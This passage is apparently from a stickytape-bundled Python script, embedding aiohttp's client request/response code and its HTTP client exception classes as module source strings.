\'1.1\' => (1, 1)\r\n        """\r\n        if isinstance(version, str):\r\n            v = [part.strip() for part in version.split(".", 1)]\r\n            try:\r\n                version = http.HttpVersion(int(v[0]), int(v[1]))\r\n            except ValueError:\r\n                raise ValueError(\r\n                    f"Can not parse http version number: {version}"\r\n                ) from None\r\n        self.version = version\r\n\r\n    def update_headers(self, headers: Optional[LooseHeaders]) -> None:\r\n        """Update request headers."""\r\n        self.headers = CIMultiDict()  # type: CIMultiDict[str]\r\n\r\n        # add host\r\n        netloc = cast(str, self.url.raw_host)\r\n        if helpers.is_ipv6_address(netloc):\r\n            netloc = f"[{netloc}]"\r\n        if self.url.port is not None and not self.url.is_default_port():\r\n            netloc += ":" + str(self.url.port)\r\n        self.headers[hdrs.HOST] = netloc\r\n\r\n        if headers:\r\n            if isinstance(headers, (dict, MultiDictProxy, MultiDict)):\r\n                headers = headers.items()  # type: ignore[assignment]\r\n\r\n            for key, value in headers:  # type: ignore[misc]\r\n                # A special case for Host header\r\n                if key.lower() == "host":\r\n                    self.headers[key] = value\r\n                else:\r\n                    self.headers.add(key, value)\r\n\r\n    def update_auto_headers(self, skip_auto_headers: Iterable[str]) -> None:\r\n        self.skip_auto_headers = CIMultiDict(\r\n            (hdr, None) for hdr in sorted(skip_auto_headers)\r\n        )\r\n        used_headers = self.headers.copy()\r\n        used_headers.extend(self.skip_auto_headers)  # type: ignore[arg-type]\r\n\r\n        for hdr, val in self.DEFAULT_HEADERS.items():\r\n            if hdr not in used_headers:\r\n                self.headers.add(hdr, val)\r\n\r\n        if hdrs.USER_AGENT not in used_headers:\r\n            self.headers[hdrs.USER_AGENT] = SERVER_SOFTWARE\r\n\r\n    def update_cookies(self, cookies: Optional[LooseCookies]) -> None:\r\n        """Update request cookies header."""\r\n        if not cookies:\r\n            return\r\n\r\n        c = SimpleCookie()  # type: SimpleCookie[str]\r\n        if hdrs.COOKIE in self.headers:\r\n            c.load(self.headers.get(hdrs.COOKIE, ""))\r\n            del self.headers[hdrs.COOKIE]\r\n\r\n        if isinstance(cookies, Mapping):\r\n            iter_cookies = cookies.items()\r\n        else:\r\n            iter_cookies = cookies  # type: ignore[assignment]\r\n        for name, value in iter_cookies:\r\n            if isinstance(value, Morsel):\r\n                # Preserve coded_value\r\n                mrsl_val = value.get(value.key, Morsel())\r\n                mrsl_val.set(value.key, value.value, value.coded_value)\r\n                c[name] = mrsl_val\r\n            else:\r\n                c[name] = value  # type: ignore[assignment]\r\n\r\n        self.headers[hdrs.COOKIE] = c.output(header="", sep=";").strip()\r\n\r\n    def update_content_encoding(self, data: Any) -> None:\r\n        """Set request content encoding."""\r\n        if data is None:\r\n            return\r\n\r\n        enc = self.headers.get(hdrs.CONTENT_ENCODING, "").lower()\r\n        if enc:\r\n            if self.compress:\r\n                raise ValueError(\r\n                    "compress can not be set " "if Content-Encoding header is set"\r\n                )\r\n        elif self.compress:\r\n            if not isinstance(self.compress, str):\r\n                self.compress = "deflate"\r\n            self.headers[hdrs.CONTENT_ENCODING] = self.compress\r\n            self.chunked = True  # enable chunked, no need to deal with length\r\n\r\n    def update_transfer_encoding(self) -> None:\r\n        """Analyze transfer-encoding header."""\r\n        te = self.headers.get(hdrs.TRANSFER_ENCODING, "").lower()\r\n\r\n        if "chunked" in te:\r\n            if self.chunked:\r\n                raise ValueError(\r\n                    "chunked can not be set "\r\n                    \'if "Transfer-Encoding: chunked" header is set\'\r\n                )\r\n\r\n        elif self.chunked:\r\n            if hdrs.CONTENT_LENGTH in self.headers:\r\n                raise ValueError(\r\n                    "chunked can not be set " "if Content-Length header is set"\r\n                )\r\n\r\n            self.headers[hdrs.TRANSFER_ENCODING] = "chunked"\r\n        else:\r\n            if hdrs.CONTENT_LENGTH not in self.headers:\r\n                self.headers[hdrs.CONTENT_LENGTH] = str(len(self.body))\r\n\r\n    def update_auth(self, auth: Optional[BasicAuth]) -> None:\r\n        """Set basic auth."""\r\n        if auth is None:\r\n            auth = self.auth\r\n        if auth is None:\r\n            return\r\n\r\n        if not isinstance(auth, helpers.BasicAuth):\r\n            raise TypeError("BasicAuth() tuple is required instead")\r\n\r\n        self.headers[hdrs.AUTHORIZATION] = auth.encode()\r\n\r\n    def update_body_from_data(self, body: Any) -> None:\r\n        if body is None:\r\n            return\r\n\r\n        # FormData\r\n        if isinstance(body, FormData):\r\n            body = body()\r\n\r\n        try:\r\n            body = payload.PAYLOAD_REGISTRY.get(body, disposition=None)\r\n        except payload.LookupError:\r\n            body = FormData(body)()\r\n\r\n        self.body = body\r\n\r\n        # enable chunked encoding if needed\r\n        if not self.chunked:\r\n            if hdrs.CONTENT_LENGTH not in self.headers:\r\n                size = body.size\r\n                if size is None:\r\n                    self.chunked = True\r\n                else:\r\n                    if hdrs.CONTENT_LENGTH not in self.headers:\r\n                        self.headers[hdrs.CONTENT_LENGTH] = str(size)\r\n\r\n        # copy payload headers\r\n        assert body.headers\r\n        for (key, value) in body.headers.items():\r\n            if key in self.headers:\r\n                continue\r\n            if key in self.skip_auto_headers:\r\n                continue\r\n            self.headers[key] = value\r\n\r\n    def update_expect_continue(self, expect: bool = False) -> None:\r\n        if expect:\r\n            self.headers[hdrs.EXPECT] = "100-continue"\r\n        elif self.headers.get(hdrs.EXPECT, "").lower() == "100-continue":\r\n            expect = True\r\n\r\n        if expect:\r\n            self._continue = self.loop.create_future()\r\n\r\n    def update_proxy(\r\n        self,\r\n        proxy: Optional[URL],\r\n        proxy_auth: Optional[BasicAuth],\r\n        proxy_headers: Optional[LooseHeaders],\r\n    ) -> None:\r\n        if proxy_auth and not isinstance(proxy_auth, helpers.BasicAuth):\r\n            raise ValueError("proxy_auth must be None or BasicAuth() tuple")\r\n        self.proxy = proxy\r\n        self.proxy_auth = proxy_auth\r\n        self.proxy_headers = proxy_headers\r\n\r\n    def keep_alive(self) -> bool:\r\n        if self.version < HttpVersion10:\r\n            # keep alive not supported at all\r\n            return False\r\n        if self.version == HttpVersion10:\r\n            if self.headers.get(hdrs.CONNECTION) == "keep-alive":\r\n                return True\r\n            else:  # no headers means we close for Http 1.0\r\n                return False\r\n        elif self.headers.get(hdrs.CONNECTION) == "close":\r\n            return False\r\n\r\n        return True\r\n\r\n    async def write_bytes(\r\n        self, writer: AbstractStreamWriter, conn: "Connection"\r\n    ) -> None:\r\n        """Support coroutines that yields bytes objects."""\r\n        # 100 response\r\n        if self._continue is not None:\r\n            await writer.drain()\r\n            await self._continue\r\n\r\n        protocol = conn.protocol\r\n        assert protocol is not None\r\n        try:\r\n            if isinstance(self.body, payload.Payload):\r\n                await self.body.write(writer)\r\n            else:\r\n                if isinstance(self.body, (bytes, bytearray)):\r\n                    self.body = (self.body,)  # type: ignore[assignment]\r\n\r\n                for chunk in self.body:\r\n                    await writer.write(chunk)  # type: ignore[arg-type]\r\n\r\n            await writer.write_eof()\r\n        except OSError as exc:\r\n            new_exc = ClientOSError(\r\n                exc.errno, "Can not write request body for %s" % self.url\r\n            )\r\n            new_exc.__context__ = exc\r\n            new_exc.__cause__ = exc\r\n            protocol.set_exception(new_exc)\r\n        except asyncio.CancelledError as exc:\r\n            if not conn.closed:\r\n                protocol.set_exception(exc)\r\n        except Exception as exc:\r\n            protocol.set_exception(exc)\r\n        finally:\r\n            self._writer = None\r\n\r\n    async def send(self, conn: "Connection") -> "ClientResponse":\r\n        # Specify request target:\r\n        # - CONNECT request must send authority form URI\r\n        # - not CONNECT proxy must send absolute form URI\r\n        # - most common is origin form URI\r\n        if self.method == hdrs.METH_CONNECT:\r\n            connect_host = self.url.raw_host\r\n            assert connect_host is not None\r\n            if helpers.is_ipv6_address(connect_host):\r\n                connect_host = f"[{connect_host}]"\r\n            path = f"{connect_host}:{self.url.port}"\r\n        elif self.proxy and not self.is_ssl():\r\n            path = str(self.url)\r\n        else:\r\n            path = self.url.raw_path\r\n            if self.url.raw_query_string:\r\n                path += "?" + self.url.raw_query_string\r\n\r\n        protocol = conn.protocol\r\n        assert protocol is not None\r\n        writer = StreamWriter(\r\n            protocol,\r\n            self.loop,\r\n            on_chunk_sent=functools.partial(\r\n                self._on_chunk_request_sent, self.method, self.url\r\n            ),\r\n            on_headers_sent=functools.partial(\r\n                self._on_headers_request_sent, self.method, self.url\r\n            ),\r\n        )\r\n\r\n        if self.compress:\r\n            writer.enable_compression(self.compress)\r\n\r\n        if self.chunked is not None:\r\n            writer.enable_chunking()\r\n\r\n        # set default content-type\r\n        if (\r\n            self.method in self.POST_METHODS\r\n            and hdrs.CONTENT_TYPE not in self.skip_auto_headers\r\n            and hdrs.CONTENT_TYPE not in self.headers\r\n        ):\r\n            self.headers[hdrs.CONTENT_TYPE] = "application/octet-stream"\r\n\r\n        # set the connection header\r\n        connection = self.headers.get(hdrs.CONNECTION)\r\n        if not connection:\r\n            if self.keep_alive():\r\n                if self.version == HttpVersion10:\r\n                    connection = "keep-alive"\r\n            else:\r\n                if self.version == HttpVersion11:\r\n                    connection = "close"\r\n\r\n        if connection is not None:\r\n            self.headers[hdrs.CONNECTION] = connection\r\n\r\n        # status + headers\r\n        status_line = "{0} {1} HTTP/{2[0]}.{2[1]}".format(\r\n            self.method, path, self.version\r\n        )\r\n        await writer.write_headers(status_line, self.headers)\r\n\r\n        self._writer = self.loop.create_task(self.write_bytes(writer, conn))\r\n\r\n        response_class = self.response_class\r\n        assert response_class is not None\r\n        self.response = response_class(\r\n            self.method,\r\n            self.original_url,\r\n            writer=self._writer,\r\n            continue100=self._continue,\r\n            timer=self._timer,\r\n            request_info=self.request_info,\r\n            traces=self._traces,\r\n            loop=self.loop,\r\n            session=self._session,\r\n        )\r\n        return self.response\r\n\r\n    async def close(self) -> None:\r\n        if self._writer is not None:\r\n            try:\r\n                await self._writer\r\n            finally:\r\n                self._writer = None\r\n\r\n    def terminate(self) -> None:\r\n        if self._writer is not None:\r\n            if not self.loop.is_closed():\r\n                self._writer.cancel()\r\n            self._writer = None\r\n\r\n    async def _on_chunk_request_sent(self, method: str, url: URL, chunk: bytes) -> None:\r\n        for trace in self._traces:\r\n            await trace.send_request_chunk_sent(method, url, chunk)\r\n\r\n    async def _on_headers_request_sent(\r\n        self, method: str, url: URL, headers: "CIMultiDict[str]"\r\n    ) -> None:\r\n        for trace in self._traces:\r\n            await trace.send_request_headers(method, url, headers)\r\n\r\n\r\nclass ClientResponse(HeadersMixin):\r\n\r\n    # from the Status-Line of the response\r\n    version = None  # HTTP-Version\r\n    status = None  # type: int  # Status-Code\r\n    reason = None  # Reason-Phrase\r\n\r\n    content = None  # type: StreamReader  # Payload stream\r\n    _headers = None  # type: CIMultiDictProxy[str]  # Response headers\r\n    _raw_headers = None  # type: RawHeaders  # Response raw headers\r\n\r\n    _connection = None  # current connection\r\n    _source_traceback = None\r\n    # setted up by ClientRequest after ClientResponse object creation\r\n    # post-init stage allows to not change ctor signature\r\n    _closed = True  # to allow __del__ for non-initialized properly response\r\n    _released = False\r\n\r\n    def __init__(\r\n        self,\r\n        method: str,\r\n        url: URL,\r\n        *,\r\n        writer: "asyncio.Task[None]",\r\n        continue100: Optional["asyncio.Future[bool]"],\r\n        timer: BaseTimerContext,\r\n        request_info: RequestInfo,\r\n        traces: List["Trace"],\r\n        loop: asyncio.AbstractEventLoop,\r\n        session: "ClientSession",\r\n    ) -> None:\r\n        assert isinstance(url, URL)\r\n\r\n        self.method = method\r\n        self.cookies = SimpleCookie()  # type: SimpleCookie[str]\r\n\r\n        self._real_url = url\r\n        self._url = url.with_fragment(None)\r\n        self._body = None  # type: Any\r\n        self._writer = writer  # type: Optional[asyncio.Task[None]]\r\n        self._continue = continue100  # None by default\r\n        self._closed = True\r\n        self._history = ()  # type: Tuple[ClientResponse, ...]\r\n        self._request_info = request_info\r\n        self._timer = timer if timer is not None else TimerNoop()\r\n        self._cache = {}  # type: Dict[str, Any]\r\n        self._traces = traces\r\n        self._loop = loop\r\n        # store a reference to session #1985\r\n        self._session = session  # type: Optional[ClientSession]\r\n        if loop.get_debug():\r\n            self._source_traceback = traceback.extract_stack(sys._getframe(1))\r\n\r\n    @reify\r\n    def url(self) -> URL:\r\n        return self._url\r\n\r\n    @reify\r\n    def url_obj(self) -> URL:\r\n        warnings.warn("Deprecated, use .url #1654", DeprecationWarning, stacklevel=2)\r\n        return self._url\r\n\r\n    @reify\r\n    def real_url(self) -> URL:\r\n        return self._real_url\r\n\r\n    @reify\r\n    def host(self) -> str:\r\n        assert self._url.host is not None\r\n        return self._url.host\r\n\r\n    @reify\r\n    def headers(self) -> "CIMultiDictProxy[str]":\r\n        return self._headers\r\n\r\n    @reify\r\n    def raw_headers(self) -> RawHeaders:\r\n        return self._raw_headers\r\n\r\n    @reify\r\n    def request_info(self) -> RequestInfo:\r\n        return self._request_info\r\n\r\n    @reify\r\n    def content_disposition(self) -> Optional[ContentDisposition]:\r\n        raw = self._headers.get(hdrs.CONTENT_DISPOSITION)\r\n        if raw is None:\r\n            return None\r\n        disposition_type, params_dct = multipart.parse_content_disposition(raw)\r\n        params = MappingProxyType(params_dct)\r\n        filename = multipart.content_disposition_filename(params)\r\n        return ContentDisposition(disposition_type, params, filename)\r\n\r\n    def __del__(self, _warnings: Any = warnings) -> None:\r\n        if self._closed:\r\n            return\r\n\r\n        if self._connection is not None:\r\n            self._connection.release()\r\n            self._cleanup_writer()\r\n\r\n            if self._loop.get_debug():\r\n                if PY_36:\r\n                    kwargs = {"source": self}\r\n                else:\r\n                    kwargs = {}\r\n                _warnings.warn(f"Unclosed response {self!r}", ResourceWarning, **kwargs)\r\n                context = {"client_response": self, "message": "Unclosed response"}\r\n                if self._source_traceback:\r\n                    context["source_traceback"] = self._source_traceback\r\n                self._loop.call_exception_handler(context)\r\n\r\n    def __repr__(self) -> str:\r\n        out = io.StringIO()\r\n        ascii_encodable_url = str(self.url)\r\n        if self.reason:\r\n            ascii_encodable_reason = self.reason.encode(\r\n                "ascii", "backslashreplace"\r\n            ).decode("ascii")\r\n        else:\r\n            ascii_encodable_reason = self.reason\r\n        print(\r\n            "<ClientResponse({}) [{} {}]>".format(\r\n                ascii_encodable_url, self.status, ascii_encodable_reason\r\n            ),\r\n            file=out,\r\n        )\r\n        print(self.headers, file=out)\r\n        return out.getvalue()\r\n\r\n    @property\r\n    def connection(self) -> Optional["Connection"]:\r\n        return self._connection\r\n\r\n    @reify\r\n    def history(self) -> Tuple["ClientResponse", ...]:\r\n        """A sequence of of responses, if redirects occurred."""\r\n        return self._history\r\n\r\n    @reify\r\n    def links(self) -> "MultiDictProxy[MultiDictProxy[Union[str, URL]]]":\r\n        links_str = ", ".join(self.headers.getall("link", []))\r\n\r\n        if not links_str:\r\n            return MultiDictProxy(MultiDict())\r\n\r\n        links = MultiDict()  # type: MultiDict[MultiDictProxy[Union[str, URL]]]\r\n\r\n        for val in re.split(r",(?=\\s*<)", links_str):\r\n            match = re.match(r"\\s*<(.*)>(.*)", val)\r\n            if match is None:  # pragma: no cover\r\n                # the check exists to suppress mypy error\r\n                continue\r\n            url, params_str = match.groups()\r\n            params = params_str.split(";")[1:]\r\n\r\n            link = MultiDict()  # type: MultiDict[Union[str, URL]]\r\n\r\n            for param in params:\r\n                match = re.match(r"^\\s*(\\S*)\\s*=\\s*([\'\\"]?)(.*?)(\\2)\\s*$", param, re.M)\r\n                if match is None:  # pragma: no cover\r\n                    # the check exists to suppress mypy error\r\n                    continue\r\n                key, _, value, _ = match.groups()\r\n\r\n                link.add(key, value)\r\n\r\n            key = link.get("rel", url)  # type: ignore[assignment]\r\n\r\n            link.add("url", self.url.join(URL(url)))\r\n\r\n            links.add(key, MultiDictProxy(link))\r\n\r\n        return MultiDictProxy(links)\r\n\r\n    async def start(self, connection: "Connection") -> "ClientResponse":\r\n        """Start response processing."""\r\n        self._closed = False\r\n        self._protocol = connection.protocol\r\n        self._connection = connection\r\n\r\n        with self._timer:\r\n            while True:\r\n                # read response\r\n                try:\r\n                    protocol = self._protocol\r\n                    message, payload = await protocol.read()  # type: ignore[union-attr]\r\n                except http.HttpProcessingError as exc:\r\n                    raise ClientResponseError(\r\n                        self.request_info,\r\n                        self.history,\r\n                        status=exc.code,\r\n                        message=exc.message,\r\n                        headers=exc.headers,\r\n                    ) from exc\r\n\r\n                if message.code < 100 or message.code > 199 or message.code == 101:\r\n                    break\r\n\r\n                if self._continue is not None:\r\n                    set_result(self._continue, True)\r\n                    self._continue = None\r\n\r\n        # payload eof handler\r\n        payload.on_eof(self._response_eof)\r\n\r\n        # response status\r\n        self.version = message.version\r\n        self.status = message.code\r\n        self.reason = message.reason\r\n\r\n        # headers\r\n        self._headers = message.headers  # type is CIMultiDictProxy\r\n        self._raw_headers = message.raw_headers  # type is Tuple[bytes, bytes]\r\n\r\n        # payload\r\n        self.content = payload\r\n\r\n        # cookies\r\n        for hdr in self.headers.getall(hdrs.SET_COOKIE, ()):\r\n            try:\r\n                self.cookies.load(hdr)\r\n            except CookieError as exc:\r\n                client_logger.warning("Can not load response cookies: %s", exc)\r\n        return self\r\n\r\n    def _response_eof(self) -> None:\r\n        if self._closed:\r\n            return\r\n\r\n        if self._connection is not None:\r\n            # websocket, protocol could be None because\r\n            # connection could be detached\r\n            if (\r\n                self._connection.protocol is not None\r\n                and self._connection.protocol.upgraded\r\n            ):\r\n                return\r\n\r\n            self._connection.release()\r\n            self._connection = None\r\n\r\n        self._closed = True\r\n        self._cleanup_writer()\r\n\r\n    @property\r\n    def closed(self) -> bool:\r\n        return self._closed\r\n\r\n    def close(self) -> None:\r\n        if not self._released:\r\n            self._notify_content()\r\n        if self._closed:\r\n            return\r\n\r\n        self._closed = True\r\n        if self._loop is None or self._loop.is_closed():\r\n            return\r\n\r\n        if self._connection is not None:\r\n            self._connection.close()\r\n            self._connection = None\r\n        self._cleanup_writer()\r\n\r\n    def release(self) -> Any:\r\n        if not self._released:\r\n            self._notify_content()\r\n        if self._closed:\r\n            return noop()\r\n\r\n        self._closed = True\r\n        if self._connection is not None:\r\n            self._connection.release()\r\n            self._connection = None\r\n\r\n        self._cleanup_writer()\r\n        return noop()\r\n\r\n    @property\r\n    def ok(self) -> bool:\r\n        """Returns ``True`` if ``status`` is less than ``400``, ``False`` if not.\r\n\r\n        This is **not** a check for ``200 OK`` but a check that the response\r\n        status is under 400.\r\n        """\r\n        return 400 > self.status\r\n\r\n    def raise_for_status(self) -> None:\r\n        if not self.ok:\r\n            # reason should always be not None for a started response\r\n            assert self.reason is not None\r\n            self.release()\r\n            raise ClientResponseError(\r\n                self.request_info,\r\n                self.history,\r\n                status=self.status,\r\n                message=self.reason,\r\n                headers=self.headers,\r\n            )\r\n\r\n    def _cleanup_writer(self) -> None:\r\n        if self._writer is not None:\r\n            self._writer.cancel()\r\n        self._writer = None\r\n        self._session = None\r\n\r\n    def _notify_content(self) -> None:\r\n        content = self.content\r\n        if content and content.exception() is None:\r\n            content.set_exception(ClientConnectionError("Connection closed"))\r\n        self._released = True\r\n\r\n    async def wait_for_close(self) -> None:\r\n        if self._writer is not None:\r\n            try:\r\n                await self._writer\r\n            finally:\r\n                self._writer = None\r\n        self.release()\r\n\r\n    async def read(self) -> bytes:\r\n        """Read response payload."""\r\n        if self._body is None:\r\n            try:\r\n                self._body = await self.content.read()\r\n                for trace in self._traces:\r\n                    await trace.send_response_chunk_received(\r\n                        self.method, self.url, self._body\r\n                    )\r\n            except BaseException:\r\n                self.close()\r\n                raise\r\n        elif self._released:\r\n            raise ClientConnectionError("Connection closed")\r\n\r\n        return self._body  # type: ignore[no-any-return]\r\n\r\n    def get_encoding(self) -> str:\r\n        ctype = self.headers.get(hdrs.CONTENT_TYPE, "").lower()\r\n        mimetype = helpers.parse_mimetype(ctype)\r\n\r\n        encoding = mimetype.parameters.get("charset")\r\n        if encoding:\r\n            try:\r\n                codecs.lookup(encoding)\r\n            except LookupError:\r\n                encoding = None\r\n        if not encoding:\r\n            if mimetype.type == "application" and (\r\n                mimetype.subtype == "json" or mimetype.subtype == "rdap"\r\n            ):\r\n                # RFC 7159 states that the default encoding is UTF-8.\r\n                # RFC 7483 defines application/rdap+json\r\n                encoding = "utf-8"\r\n            elif self._body is None:\r\n                raise RuntimeError(\r\n                    "Cannot guess the encoding of " "a not yet read body"\r\n                )\r\n            else:\r\n                encoding = chardet.detect(self._body)["encoding"]\r\n        if not encoding:\r\n            encoding = "utf-8"\r\n\r\n        return encoding\r\n\r\n    async def text(self, encoding: Optional[str] = None, errors: str = "strict") -> str:\r\n        """Read response payload and decode."""\r\n        if self._body is None:\r\n            await self.read()\r\n\r\n        if encoding is None:\r\n            encoding = self.get_encoding()\r\n\r\n        return self._body.decode(  # type: ignore[no-any-return,union-attr]\r\n            encoding, errors=errors\r\n        )\r\n\r\n    async def json(\r\n        self,\r\n        *,\r\n        encoding: Optional[str] = None,\r\n        loads: JSONDecoder = DEFAULT_JSON_DECODER,\r\n        content_type: Optional[str] = "application/json",\r\n    ) -> Any:\r\n        """Read and decodes JSON response."""\r\n        if self._body is None:\r\n            await self.read()\r\n\r\n        if content_type:\r\n            ctype = self.headers.get(hdrs.CONTENT_TYPE, "").lower()\r\n            if not _is_expected_content_type(ctype, content_type):\r\n                raise ContentTypeError(\r\n                    self.request_info,\r\n                    self.history,\r\n                    message=(\r\n                        "Attempt to decode JSON with " "unexpected mimetype: %s" % ctype\r\n                    ),\r\n                    headers=self.headers,\r\n                )\r\n\r\n        stripped = self._body.strip()  # type: ignore[union-attr]\r\n        if not stripped:\r\n            return None\r\n\r\n        if encoding is None:\r\n            encoding = self.get_encoding()\r\n\r\n        return loads(stripped.decode(encoding))\r\n\r\n    async def __aenter__(self) -> "ClientResponse":\r\n        return self\r\n\r\n    async def __aexit__(\r\n        self,\r\n        exc_type: Optional[Type[BaseException]],\r\n        exc_val: Optional[BaseException],\r\n        exc_tb: Optional[TracebackType],\r\n    ) -> None:\r\n        # similar to _RequestContextManager, we do not need to check\r\n        # for exceptions, response object can close connection\r\n        # if state is broken\r\n        self.release()\r\n')
    __stickytape_write_module('aiohttp/client_exceptions.py', b'"""HTTP related errors."""\r\n\r\nimport asyncio\r\nimport warnings\r\nfrom typing import TYPE_CHECKING, Any, Optional, Tuple, Union\r\n\r\nfrom .http_parser import RawResponseMessage\r\nfrom .typedefs import LooseHeaders\r\n\r\ntry:\r\n    import ssl\r\n\r\n    SSLContext = ssl.SSLContext\r\nexcept ImportError:  # pragma: no cover\r\n    ssl = SSLContext = None  # type: ignore[assignment]\r\n\r\n\r\nif TYPE_CHECKING:  # pragma: no cover\r\n    from .client_reqrep import ClientResponse, ConnectionKey, Fingerprint, RequestInfo\r\nelse:\r\n    RequestInfo = ClientResponse = ConnectionKey = None\r\n\r\n__all__ = (\r\n    "ClientError",\r\n    "ClientConnectionError",\r\n    "ClientOSError",\r\n    "ClientConnectorError",\r\n    "ClientProxyConnectionError",\r\n    "ClientSSLError",\r\n    "ClientConnectorSSLError",\r\n    "ClientConnectorCertificateError",\r\n    "ServerConnectionError",\r\n    "ServerTimeoutError",\r\n    "ServerDisconnectedError",\r\n    "ServerFingerprintMismatch",\r\n    "ClientResponseError",\r\n    "ClientHttpProxyError",\r\n    "WSServerHandshakeError",\r\n    "ContentTypeError",\r\n    "ClientPayloadError",\r\n    "InvalidURL",\r\n)\r\n\r\n\r\nclass ClientError(Exception):\r\n    """Base class for client connection errors."""\r\n\r\n\r\nclass ClientResponseError(ClientError):\r\n    """Connection error during reading response.\r\n\r\n    request_info: instance of RequestInfo\r\n    """\r\n\r\n    def __init__(\r\n        self,\r\n        request_info: RequestInfo,\r\n        history: Tuple[ClientResponse, ...],\r\n        *,\r\n        code: Optional[int] = None,\r\n        status: Optional[int] = None,\r\n        message: str = "",\r\n        headers: Optional[LooseHeaders] = None,\r\n    ) -> None:\r\n        self.request_info = request_info\r\n        if code is not None:\r\n            if status is not None:\r\n                raise ValueError(\r\n                    "Both code and status arguments are provided; "\r\n                    "code is deprecated, use status instead"\r\n                )\r\n            warnings.warn(\r\n                "code argument is deprecated, use status instead",\r\n                DeprecationWarning,\r\n                stacklevel=2,\r\n            )\r\n        if status is not None:\r\n            self.status = status\r\n        elif code is not None:\r\n            self.status = code\r\n        else:\r\n            self.status = 0\r\n        self.message = message\r\n        self.headers = headers\r\n        self.history = history\r\n        self.args = (request_info, history)\r\n\r\n    def __str__(self) -> str:\r\n        return "{}, message={!r}, url={!r}".format(\r\n            self.status,\r\n            self.message,\r\n            self.request_info.real_url,\r\n        )\r\n\r\n    def __repr__(self) -> str:\r\n        args = f"{self.request_info!r}, {self.history!r}"\r\n        if self.status != 0:\r\n            args += f", status={self.status!r}"\r\n        if self.message != "":\r\n            args += f", message={self.message!r}"\r\n        if self.headers is not None:\r\n            args += f", headers={self.headers!r}"\r\n        return f"{type(self).__name__}({args})"\r\n\r\n    @property\r\n    def code(self) -> int:\r\n        warnings.warn(\r\n            "code property is deprecated, use status instead",\r\n            DeprecationWarning,\r\n            stacklevel=2,\r\n        )\r\n        return self.status\r\n\r\n    @code.setter\r\n    def code(self, value: int) -> None:\r\n        warnings.warn(\r\n            "code property is deprecated, use status instead",\r\n            DeprecationWarning,\r\n            stacklevel=2,\r\n        )\r\n        self.status = value\r\n\r\n\r\nclass ContentTypeError(ClientResponseError):\r\n    """ContentType found is not valid."""\r\n\r\n\r\nclass WSServerHandshakeError(ClientResponseError):\r\n    """websocket server handshake error."""\r\n\r\n\r\nclass ClientHttpProxyError(ClientResponseError):\r\n    """HTTP proxy error.\r\n\r\n    Raised in :class:`aiohttp.connector.TCPConnector` if\r\n    proxy responds with status other than ``200 OK``\r\n    on ``CONNECT`` request.\r\n    """\r\n\r\n\r\nclass TooManyRedirects(ClientResponseError):\r\n    """Client was redirected too many times."""\r\n\r\n\r\nclass ClientConnectionError(ClientError):\r\n    """Base class for client socket errors."""\r\n\r\n\r\nclass ClientOSError(ClientConnectionError, OSError):\r\n    """OSError error."""\r\n\r\n\r\nclass ClientConnectorError(ClientOSError):\r\n    """Client connector error.\r\n\r\n    Raised in :class:`aiohttp.connector.TCPConnector` if\r\n        connection to proxy can not be established.\r\n    """\r\n\r\n    def __init__(self, connection_key: ConnectionKey, os_error: OSError) -> None:\r\n        self._conn_key = connection_key\r\n        self._os_error = os_error\r\n        super().__init__(os_error.errno, os_error.strerror)\r\n        self.args = (connection_key, os_error)\r\n\r\n    @property\r\n    def os_error(self) -> OSError:\r\n        return self._os_error\r\n\r\n    @property\r\n    def host(self) -> str:\r\n        return self._conn_key.host\r\n\r\n    @property\r\n    def port(self) -> Optional[int]:\r\n        return self._conn_key.port\r\n\r\n    @property\r\n    def ssl(self) -> Union[SSLContext, None, bool, "Fingerprint"]:\r\n        return self._conn_key.ssl\r\n\r\n    def __str__(self) -> str:\r\n        return "Cannot connect to host {0.host}:{0.port} ssl:{1} [{2}]".format(\r\n            self, self.ssl if self.ssl is not None else "default", self.strerror\r\n        )\r\n\r\n    # OSError.__reduce__ does too much black magick\r\n    __reduce__ = BaseException.__reduce__\r\n\r\n\r\nclass ClientProxyConnectionError(ClientConnectorError):\r\n    """Proxy connection error.\r\n\r\n    Raised in :class:`aiohttp.connector.TCPConnector` if\r\n        connection to proxy can not be established.\r\n    """\r\n\r\n\r\nclass UnixClientConnectorError(ClientConnectorError):\r\n    """Unix connector error.\r\n\r\n    Raised in :py:class:`aiohttp.connector.UnixConnector`\r\n    if connection to unix socket can not be established.\r\n    """\r\n\r\n    def __init__(\r\n        self, path: str, connection_key: ConnectionKey, os_error: OSError\r\n    ) -> None:\r\n        self._path = path\r\n        super().__init__(connection_key, os_error)\r\n\r\n    @property\r\n    def path(self) -> str:\r\n        return self._path\r\n\r\n    def __str__(self) -> str:\r\n        return "Cannot connect to unix socket {0.path} ssl:{1} [{2}]".format(\r\n            self, self.ssl if self.ssl is not None else "default", self.strerror\r\n        )\r\n\r\n\r\nclass ServerConnectionError(ClientConnectionError):\r\n    """Server connection errors."""\r\n\r\n\r\nclass ServerDisconnectedError(ServerConnectionError):\r\n    """Server disconnected."""\r\n\r\n    def __init__(self, message: Union[RawResponseMessage, str, None] = None) -> None:\r\n        if message is None:\r\n            message = "Server disconnected"\r\n\r\n        self.args = (message,)\r\n        self.message = message\r\n\r\n\r\nclass ServerTimeoutError(ServerConnectionError, asyncio.TimeoutError):\r\n    """Server timeout error."""\r\n\r\n\r\nclass ServerFingerprintMismatch(ServerConnectionError):\r\n    """SSL certificate does not match expected fingerprint."""\r\n\r\n    def __init__(self, expected: bytes, got: bytes, host: str, port: int) -> None:\r\n        self.expected = expected\r\n        self.got = got\r\n        self.host = host\r\n        self.port = port\r\n        self.args = (expected, got, host, port)\r\n\r\n    def __repr__(self) -> str:\r\n        return "<{} expected={!r} got={!r} host={!r} port={!r}>".format(\r\n            self.__class__.__name__, self.expected, self.got, self.host, self.port\r\n        )\r\n\r\n\r\nclass ClientPayloadError(ClientError):\r\n    """Response payload error."""\r\n\r\n\r\nclass InvalidURL(ClientError, ValueError):\r\n    """Invalid URL.\r\n\r\n    URL used for fetching is malformed, e.g. it doesn\'t contains host\r\n    part.\r\n    """\r\n\r\n    # Derive from ValueError for backward compatibility\r\n\r\n    def __init__(self, url: Any) -> None:\r\n        # The type of url is not yarl.URL because the exception can be raised\r\n        # on URL(url) call\r\n        super().__init__(url)\r\n\r\n    @property\r\n    def url(self) -> Any:\r\n        return self.args[0]\r\n\r\n    def __repr__(self) -> str:\r\n        return f"<{self.__class__.__name__} {self.url}>"\r\n\r\n\r\nclass ClientSSLError(ClientConnectorError):\r\n    """Base error for ssl.*Errors."""\r\n\r\n\r\nif ssl is not None:\r\n    cert_errors = (ssl.CertificateError,)\r\n    cert_errors_bases = (\r\n        ClientSSLError,\r\n        ssl.CertificateError,\r\n    )\r\n\r\n    